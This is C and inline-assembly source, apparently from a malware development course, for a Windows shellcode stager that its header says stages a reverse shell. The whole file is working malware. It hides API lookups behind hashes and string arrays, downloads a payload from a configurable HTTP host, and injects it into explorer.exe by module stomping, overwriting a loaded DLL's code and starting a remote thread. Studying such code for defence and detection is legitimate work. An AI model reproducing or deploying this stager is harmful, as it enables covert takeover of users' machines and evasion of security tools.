/*! 
 *  Author:      @C5pider 
 *  Date:        23.09.2023
 *  Description: simple shellcode that stages a reverse shell 
 *
 *  Maldev Academy 
 */

#include "shellcode.h"

/*!
 * NOTE:
 *    this code has been compiled using the 
 *    x64_86 Mingw cross compiler on linux. 
 *    So keep in mind that this might not compile 
 *    under Visual studio. 
 */

/*!
 * @brief
 *  a small stub that aligns the stack
 *  by 16-bytes as specified in the 
 *  official Microsoft documentation.
 *  this part is getting executed first when 
 *  the shellcode is getting invoked.
 */
asm(
  "Start:                         \n"
  " push rsi                      \n"
  " mov  rsi, rsp                 \n"
  " and  rsp, 0xFFFFFFFFFFFFFFF0  \n"
  " sub  rsp, 0x20                \n"
  " call Main                     \n"
  " mov  rsp, rsi                 \n"
  " pop  rsi                      \n"
  " ret                           \n"
);

/*!
* @brief
*   shellcode main function
*
*   it gets the payload from a http server and executes it via module stomping.
*/
VOID Main() {
  INSTANCE Instance     = { 0 }; 
  PVOID    Payload      = { 0 };
  SIZE_T   PayloadSize  = { 0 };
  ULONG    Pid          = { 0 };
  CHAR     DllWinHttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', NULL };
  CHAR     DllTarget[]  = { 'w', 'i', 'n', 'd', 'o', 'w', 's', '.', 's', 't', 'o', 'r', 'a', 'g', 'e', '.', 'd', 'l', 'l', 0 };

  /* connection info 172.20.10.2
   * TODO: change this to your own host address to pull from */ 
  WCHAR  Host[] = { L'1', L'7', L'2', L'.', L'2', L'0', L'.', L'1', L'0', L'.', L'2', NULL };
  WCHAR  Path[] = { L'/', L'p', L'a', L'y', L'l', L'o', L'a', L'd', L'.', L'b', L'i', L'n', NULL }; 
  USHORT Port   = 8000;

  RtlSecureZeroMemory( &Instance, sizeof( Instance ) );
  
  /* Load Ntdll from PEB */
  if ( ( Instance.Modules.Ntdll = LdrModulePeb( H_MOD_NTDLL ) ) ) {

    if ( ! ( Instance.Win32.RtlAllocateHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLALLOCATEHEAP ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.RtlReAllocateHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLREALLOCATEHEAP ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.RtlFreeHeap = LdrFunctionAddr( Instance.Modules.Ntdll, H_API_RTLFREEHEAP ) ) ) {
      return; 
    }

  } else return;

  /* Load kernel32 from PEB */
  if ( ( Instance.Modules.Kernel32 = LdrModulePeb( H_MOD_KERNEL32 ) ) ) {

    if ( ! ( Instance.Win32.LoadLibraryA = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_LOADLIBRARYA ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.CreateToolhelp32Snapshot = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_CREATETOOLHELP32SNAPSHOT ) ) ) {
      return; 
    }    

    if ( ! ( Instance.Win32.Process32First = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_PROCESS32FIRST ) ) ) {
      return; 
    }    

    if ( ! ( Instance.Win32.Process32Next = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_PROCESS32NEXT ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.OpenProcess = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_OPENPROCESS ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.VirtualAllocEx = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_VIRTUALALLOCEX ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.VirtualProtectEx = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_VIRTUALPROTECTEX ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WriteProcessMemory = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_WRITEPROCESSMEMORY ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.CreateRemoteThread = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_CREATEREMOTETHREAD ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.EnumProcessModules = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_K32ENUMPROCESSMODULES ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.GetModuleBaseNameA = LdrFunctionAddr( Instance.Modules.Kernel32, H_API_K32GETMODULEBASENAMEA ) ) ) {
      return; 
    }


  } else return;

  /* resolve winhttp functions */
  if ( ( Instance.Modules.WinHttp = Instance.Win32.LoadLibraryA( DllWinHttp ) ) ) {
    
    if ( ! ( Instance.Win32.WinHttpOpen = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPOPEN ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpConnect = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPCONNECT ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpOpenRequest = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPOPENREQUEST ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpSendRequest = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPSENDREQUEST ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpReceiveResponse = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPRECEIVERESPONSE ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpReadData = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPREADDATA ) ) ) {
      return; 
    }

    if ( ! ( Instance.Win32.WinHttpCloseHandle = LdrFunctionAddr( Instance.Modules.WinHttp, H_API_WINHTTPCLOSEHANDLE ) ) ) {
      return; 
    }

  } else return;

  /* get payload from a remote http server */
  if ( ! HttpGetPayload( &Instance, Host, Port, Path, &Payload, &PayloadSize ) ) {
    return; 
  }

  /* try to get the process id from explorer.exe by the name hash */
  if ( ! ProcessPidByHash( &Instance, H_STR_EXPLORER_EXE, &Pid ) ) {
    return;
  }

  /* load and inject received payload */
  ModStompInject( &Instance, Pid, DllTarget, sizeof( DllTarget ), Payload, PayloadSize );
}

BOOL HttpGetPayload(
  _In_  PINSTANCE Instance, 
  _In_  LPWSTR    Host,
  _In_  USHORT    Port, 
  _In_  LPWSTR    Path, 
  _Out_ PVOID*    Payload,
  _Out_ PSIZE_T   Size   
) {

  BOOL   Success        = FALSE;
  ULONG  Read           = 0;
  ULONG  Length         = 0; 
  HANDLE Heap           = { 0 };
  HANDLE Session        = { 0 };
  HANDLE Connect        = { 0 };
  HANDLE Request        = { 0 };
  BYTE   Buffer[ 1024 ] = { 0 };
  WCHAR  Method[]       = { L'G', L'E', L'T', NULL };

  RtlSecureZeroMemory( Buffer, sizeof( Buffer ) );

  Heap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;  

  if ( ! Instance || ! Host || ! Path || ! Payload || ! Size ) {
    return FALSE;
  }

  if ( ! ( Session = Instance->Win32.WinHttpOpen( NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0 ) ) ) {
    goto LEAVE;
  }

  if ( ! ( Connect = Instance->Win32.WinHttpConnect( Session, Host, Port, 0 ) ) ) {
    goto LEAVE;
  }
  
  if ( ! ( Request = Instance->Win32.WinHttpOpenRequest( Connect, Method, Path, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE ) ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WinHttpSendRequest( Request, NULL, 0, NULL, 0, 0, 0 ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
    goto LEAVE;
  } 

  *Payload = NULL;

  /* read the entire payload from the request response*/
  do {
    /* read from response */
    Success = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &Read );
    if ( ! Success || Read == 0 ) {
        break;
    }

    /* allocate heap memory or more */
    if ( ! *Payload ) {
      *Payload = Instance->Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, Read );
    } else {
      *Payload = Instance->Win32.RtlReAllocateHeap( Heap, HEAP_ZERO_MEMORY, *Payload, Length + Read );
    }

    /* copy read buffer into our heap memory */
    MemCopy( C_PTR( U_PTR( *Payload ) + Length ), Buffer, Read );
    RtlSecureZeroMemory( Buffer, sizeof( Buffer ) ); 

    /* increase total read payload length */
    Length += Read;
  } while ( Success );

  *Size   = Length;
  Success = TRUE;  

LEAVE:
  if ( Session ) {
    Instance->Win32.WinHttpCloseHandle( Session );
  }

  if ( Connect ) {
    Instance->Win32.WinHttpCloseHandle( Connect );
  }

  if ( Request ) {
    Instance->Win32.WinHttpCloseHandle( Request );
  }

  return Success;
}

BOOL ProcessPidByHash(
  _In_ PINSTANCE Instance, 
  _In_ ULONG     Hash,
  _In_ PULONG    Pid
) {

  HANDLE         Snap    = { 0 };
  PROCESSENTRY32 Entry32 = { 0 };
  BOOL           Success = FALSE;

  if ( ! Instance || ! Hash || ! Pid ) {
    goto END;
  }

  /* create snapshot */
  if ( ! ( Snap = Instance->Win32.CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 ) ) ) {
    goto END;
  }
  
  Entry32.dwSize = sizeof( PROCESSENTRY32 );

  if ( ! Instance->Win32.Process32First( Snap, &Entry32 ) ) {
    goto END;
  }

  do {
    
    if ( HashString( Entry32.szExeFile, 0 ) == Hash ) {
      *Pid = Entry32.th32ProcessID;
      break;
    }

  } while ( Instance->Win32.Process32Next( Snap, &Entry32 ) ); 

  Success = TRUE;

END:
  return Success;
}

VOID ModStompInject(
  _In_ PINSTANCE Instance,
  _In_ ULONG     Pid,
  _In_ LPSTR     Dll,
  _In_ ULONG     DllSize, 
  _In_ PVOID     Payload, 
  _In_ SIZE_T    Size
) {
  PVOID  Memory              = NULL;
  ULONG  Protect             = { 0 };
  HANDLE Process             = { 0 };
  HANDLE Thread              = { 0 };
  PVOID  MmName              = { 0 }; 
  PVOID  ModList[ 256 ]      = { 0 };
  DWORD  ModSize             = { 0 };
  SIZE_T ModCount            = { 0 };
  CHAR   ModName[ MAX_PATH ] = { 0 };
  PVOID  ModBase             = { 0 };
  ULONG  Hash                = { 0 };

  if ( ! Instance || ! Dll || ! Payload || ! Size ) {
    return; 
  } 

  /*
   * Dll injection part 
   */

  if ( ! ( Process = Instance->Win32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, Pid ) ) ) {
    goto LEAVE;
  }

  if ( ! ( MmName = Instance->Win32.VirtualAllocEx( Process, 0, DllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WriteProcessMemory( Process, MmName, Dll, DllSize, NULL ) ) {
    goto LEAVE;
  }

  if ( ! ( Thread = Instance->Win32.CreateRemoteThread( Process, NULL, 0, Instance->Win32.LoadLibraryA, MmName, NULL, NULL ) ) ) {
    goto LEAVE; 
  }

  Hash = HashString( Dll, 0 );

  /*
   * get base address of injected dll 
   */
  Instance->Win32.EnumProcessModules( Process, ModList, sizeof( ModList ), &ModSize );
  ModCount = ModSize / sizeof( PVOID );
  
  for ( SIZE_T i = 0; i < ModCount; i++ ) {
    Instance->Win32.GetModuleBaseNameA( Process, ModList[ i ], ModName, sizeof( ModName ) );
    if ( HashString( ModName, 0 ) == Hash ) {
      ModBase = ModList[ i ]; 
      break; 
    }
  }

  /* 
   * the NT/DOS header is around ~0x1000 big
   * so lets skip it and get to the .text section 
   */
  ModBase += 0x1000;

  if ( ! Instance->Win32.VirtualProtectEx( Process, ModBase, Size, PAGE_READWRITE, &Protect ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.WriteProcessMemory( Process, ModBase, Payload, Size, NULL ) ) {
    goto LEAVE;
  }

  if ( ! Instance->Win32.VirtualProtectEx( Process, ModBase, Size, PAGE_EXECUTE_READ, &Protect ) ) {
    goto LEAVE;
  }

  if ( ! ( Instance->Win32.CreateRemoteThread( Process, NULL, 0, ModBase, NULL, NULL, NULL ) ) ) {
    goto LEAVE; 
  }

LEAVE:
  return;
}

ULONG HashString(
    _In_ PVOID String,
    _In_ ULONG Length
) {
    ULONG  Hash = { 0 };
    PUCHAR Ptr  = { 0 };
    UCHAR  Char = { 0 };

    Hash = 5381;
    Ptr  = String;

    do {
        Char = *Ptr;

        if ( ! Length ) {
            if ( !*Ptr ) break;
        } else {
            if ( U_PTR( Ptr - U_PTR( String ) ) >= Length ) break;
            if ( !*Ptr ) ++Ptr;
        }

        /* turn current character to uppercase */
        if ( Char >= 'a' ) {
            Char -= 0x20;
        }

        /* append hash */
        Hash = ( ( Hash << 5 ) + Hash ) + Char;

        ++Ptr;
    } while ( TRUE );

    return Hash;
}

/*!
 * @brief
 *  load module from PEB
 * 
 * @param Hash
 *  hash of module to load
 * 
 * @return
 *  module pointer
 */ 
PVOID LdrModulePeb(
  _In_ ULONG Hash
) {
    PLDR_DATA_TABLE_ENTRY Data  = NULL;
    PLIST_ENTRY           Head  = NULL;
    PLIST_ENTRY           Entry = NULL;

    /* Get pointer to list */
    Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    /* iterate over list */
    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );

        /* Compare the DLL Name! */
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
            return Data->DllBase;
        }
    }

    return NULL;
}

/*!
 * @brief
 *  gets the function pointer
 *
 * @param Module
 *  module to resolve function from
 *
 * @param Hash
 *  function hash to resolve
 *
 * @return
 *  function address 
 */
PVOID LdrFunctionAddr(
    _In_ PVOID Module,
    _In_ ULONG Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PCHAR                   FunctionName     = { 0 };

    if ( ! Module || ! Hash ) {
      return NULL;
    }

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
      FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
      if ( HashString( FunctionName, 0 ) == Hash ) {
        return C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}

